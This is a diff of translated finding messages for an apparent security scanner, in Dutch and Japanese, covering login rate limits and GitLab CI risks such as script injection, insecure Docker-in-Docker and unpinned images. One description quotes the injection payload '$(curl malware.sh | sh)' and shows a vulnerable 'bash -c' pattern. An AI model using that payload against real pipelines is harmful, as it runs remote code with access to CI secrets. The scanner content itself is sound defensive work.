@@ -7707,7 +7707,7 @@ CMD ["node", "server.js"]`,
     },
   },
   "no-login-rate-limit": {
-    title: "Het loginformulier blokkeert geen te veel pogingen achter elkaar",
+    title: "Het loginformulier blokkeert niet bij te veel pogingen achter elkaar",
     description:
       "Een loginroute is gedefinieerd in het bestand, maar er is geen spoor van rate-limiting-middleware in hetzelfde bestand. Zonder limiet op pogingen kan een aanvaller wachtwoorden na elkaar proberen (brute force) zonder te worden vertraagd.",
     fix: {
@@ -11537,8 +11537,8 @@ variables:
     },
   },
     "gitlab-ci-script-injection": {
-      title: '外部ユーザーが制御する値がGitLab CIパイプラインで2段目のシェルを通過する',
-      description: '"script:"（または "before_script:"/"after_script:"）の行が、マージリクエストのタイトル、コミットメッセージ、ブランチ名などのGitLab定義済み変数と一緒に "eval" や "sh -c"/"bash -c" を使っている — これらはすべて、外部フォークからであってもマージリクエストを開ける人なら誰でも書き込める。値はまず外側のシェルで一度展開され、それが2段目のシェルが再びコードとして解釈する文字列に貼り付けられる："$(curl malware.sh | sh)" のようなタイトルは、そのジョブで使えるすべてのシークレットにアクセスしながらパイプライン内で任意のコマンドを実行してしまう。',
+      title: '外部ユーザーが制御する値がGitLab CIパイプラインで2段目のシェルを通過します',
+      description: '"script:"（または "before_script:"/"after_script:"）の行が、マージリクエストのタイトル、コミットメッセージ、ブランチ名などのGitLab定義済み変数と一緒に "eval" や "sh -c"/"bash -c" を使っています — これらはすべて、外部フォークからであってもマージリクエストを開ける人なら誰でも書き込めます。値はまず外側のシェルで一度展開され、それが2段目のシェルが再びコードとして解釈する文字列に貼り付けられます："$(curl malware.sh | sh)" のようなタイトルは、そのジョブで使えるすべてのシークレットにアクセスしながらパイプライン内で任意のコマンドを実行してしまいます。',
       fix: {
         before: `script:
   - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
@@ -11547,8 +11547,8 @@ variables:
       },
     },
     "gitlab-ci-privileged-dind-no-tls": {
-      title: 'GitLab CIパイプラインのDocker-in-DockerがTLS暗号化を無効にしたまま動いている',
-      description: 'このジョブは "docker:dind"（パイプライン内でイメージをビルドするために必要なDocker-in-Docker）サービスを使っているが、"DOCKER_TLS_CERTDIR" を空文字列に設定しており、DockerクライアントとdindデーモンとのTLS暗号化が完全に無効になっている。TLSがなければ、ランナーの同じ内部ネットワーク上でそのポートに到達できる人は誰でも、本来そのジョブだけに限定されるべき、拡張された権限で動くDockerデーモンを制御できてしまう。',
+      title: 'GitLab CIパイプラインのDocker-in-DockerがTLS暗号化を無効にしたまま動いています',
+      description: 'このジョブは "docker:dind"（パイプライン内でイメージをビルドするために必要なDocker-in-Docker）サービスを使っていますが、"DOCKER_TLS_CERTDIR" を空文字列に設定しており、DockerクライアントとdindデーモンとのTLS暗号化が完全に無効になっています。TLSがなければ、ランナーの同じ内部ネットワーク上でそのポートに到達できる人は誰でも、本来そのジョブだけに限定されるべき、拡張された権限で動くDockerデーモンを制御できてしまいます。',
       fix: {
         before: `services:
   - docker:dind
@@ -11561,8 +11561,8 @@ variables:
       },
     },
     "gitlab-ci-unpinned-image": {
-      title: 'GitLab CIパイプラインのDockerイメージが特定バージョンに固定されていない',
-      description: 'パイプラインの "image:" がタグなしのイメージ（":latest" と同等）を指しているか、明示的に ":latest" を指している。そのイメージを管理する人は、リポジトリを変更せずにいつでも中身を差し替えられる — 同じパイプラインがある日突然違うコードを実行し始める可能性があり、コミットではなくタグで参照するGitHub Actionと概念的に同じサプライチェーンリスクになる。',
+      title: 'GitLab CIパイプラインのDockerイメージが特定バージョンに固定されていません',
+      description: 'パイプラインの "image:" がタグなしのイメージ（":latest" と同等）を指しているか、明示的に ":latest" を指しています。そのイメージを管理する人は、リポジトリを変更せずにいつでも中身を差し替えられます — 同じパイプラインがある日突然違うコードを実行し始める可能性があり、コミットではなくタグで参照するGitHub Actionと概念的に同じサプライチェーンリスクになります。',
       fix: {
         before: `image: node:latest`,
         after: `image: node:20.11.1  # "latest" の代わりに具体的なタグ（さらに良いのはダイジェスト "node@sha256:..."）`,
